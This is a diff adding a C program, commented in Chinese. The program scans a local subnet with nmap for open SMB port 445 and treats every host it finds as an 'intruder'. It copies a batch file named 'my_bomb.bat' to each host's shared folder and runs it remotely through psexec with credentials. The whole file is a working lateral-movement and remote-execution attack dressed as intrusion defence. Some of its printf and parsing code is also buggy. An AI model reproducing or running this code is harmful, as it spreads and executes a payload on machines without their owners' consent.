@@ -1,0 +1,152 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+
+// 函數：記錄日誌到文件
+void logMessage(const char *message) {
+    FILE *logFile = fopen("activity_log.txt", "a");
+    if (logFile) {
+        time_t now = time(NULL);
+        fprintf(logFile, "[%s] %s\n", ctime(&now), message);
+        fclose(logFile);
+    }
+}
+
+// 函數：執行 Nmap 掃描局域網
+void runNmapScan(const char *ipRange) {
+    char command[256];
+    snprintf(command, sizeof(command), "nmap -p 445 --open -oG scan_results.txt %s", ipRange);
+    printf("執行命令: %s\n", command);
+
+    int result = system(command);
+    if (result == 0) {
+        printf("掃描完成，結果儲存在 scan_results.txt。\n");
+        logMessage("Nmap 掃描完成。");
+    } else {
+        printf("掃描失敗。\n");
+        logMessage("Nmap 掃描失敗。");
+    }
+}
+
+// 函數：解析 Nmap 掃描結果並獲取可疑 IP 地址
+int parseScanResults(char intruders[][16], int maxIntruders) {
+    FILE *file = fopen("scan_results.txt", "r");
+    if (!file) {
+        printf("無法打開掃描結果文件。\n");
+        logMessage("無法打開掃描結果文件。");
+        return 0;
+    }
+
+    char line[256];
+    int count = 0;
+
+    while (fgets(line, sizeof(line), file)) {
+        if (strstr(line, "Host:") && strstr(line, "Ports: 445/open")) {
+            if (count >= maxIntruders) break;
+
+            // 提取 IP 地址
+            char *ipStart = strstr(line, "Host:") + 6;
+            char *ipEnd = strstr(ipStart, " ");
+            *ipEnd = '\0'; // 截斷字符串
+            strncpy(intruders[count], ipStart, 16);
+            count++;
+
+            // 記錄偵測到的 IP
+            char logEntry[128];
+            snprintf(logEntry, sizeof(logEntry), "偵測到可疑設備 IP: %s", ipStart);
+            logMessage(logEntry);
+        }
+    }
+
+    fclose(file);
+    return count;
+}
+
+// 函數：將檔案傳送到共享資料夾
+int sendFileToSharedFolder(const char *filePath, const char *targetPath) {
+    char command[512];
+    snprintf(command, sizeof(command), "copy %s %s", filePath, targetPath);
+    printf("執行命令: %s\n", command);
+
+    int result = system(command);
+    if (result == 0) {
+        printf("檔案已成功傳送至 %s。\n", targetPath);
+
+        char logEntry[256];
+        snprintf(logEntry, sizeof(logEntry), "檔案傳輸成功到: %s", targetPath);
+        logMessage(logEntry);
+
+        return 1; // 傳輸成功
+    } else {
+        printf("檔案傳輸失敗。\n");
+        logMessage("檔案傳輸失敗。");
+        return 0; // 傳輸失敗
+    }
+}
+
+// 函數：執行批次檔到目標
+void executeBatchOnTarget(const char *ipAddress, const char *filePath) {
+    char command[512];
+    snprintf(command, sizeof(command), "psexec \\\\%s -u <username> -p <password> cmd.exe /c \\\\%s\\SharedFolder\\%s", ipAddress, ipAddress, filePath);
+    printf("嘗試在目標 %s 上執行批次檔。\n", ipAddress);
+
+    int result = system(command);
+    if (result == 0) {
+        printf("成功在目標 %s 上執行批次檔。\n");
+
+        char logEntry[128];
+        snprintf(logEntry, sizeof(logEntry), "成功執行批次檔在目標: %s", ipAddress);
+        logMessage(logEntry);
+    } else {
+        printf("在目標 %s 上執行批次檔失敗。\n");
+
+        char logEntry[128];
+        snprintf(logEntry, sizeof(logEntry), "執行批次檔失敗在目標: %s", ipAddress);
+        logMessage(logEntry);
+    }
+}
+
+// 主程序
+int main() {
+    const char *ipRange = "192.168.1.0/24";
+    const char *filePath = "my_bomb.bat";
+    char intruders[10][16];
+    int maxIntruders = 10;
+
+    logMessage("程序啟動。");
+
+    // 步驟 1：掃描局域網內的設備（Nmap 掃描）
+    printf("開始掃描局域網設備...\n");
+    runNmapScan(ipRange);
+
+    // 步驟 2：解析掃描結果
+    printf("解析掃描結果以獲取目標...\n");
+    int intruderCount = parseScanResults(intruders, maxIntruders);
+
+    if (intruderCount > 0) {
+        printf("偵測到 %d 個入侵者。\n", intruderCount);
+
+        for (int i = 0; i < intruderCount; i++) {
+            printf("處理目標 IP：%s\n", intruders[i]);
+
+            char logEntry[64];
+            snprintf(logEntry, sizeof(logEntry), "正在處理目標 IP: %s", intruders[i]);
+            logMessage(logEntry);
+
+            char targetPath[256];
+            snprintf(targetPath, sizeof(targetPath), "\\\\%s\\SharedFolder", intruders[i]);
+
+            // 傳送檔案並執行批次檔
+            if (sendFileToSharedFolder(filePath, targetPath)) {
+                executeBatchOnTarget(intruders[i], filePath);
+            }
+        }
+    } else {
+        printf("系統運行正常，無非法入侵。\n");
+        logMessage("無偵測到入侵者。");
+    }
+
+    logMessage("程序結束。");
+    return 0;
+}
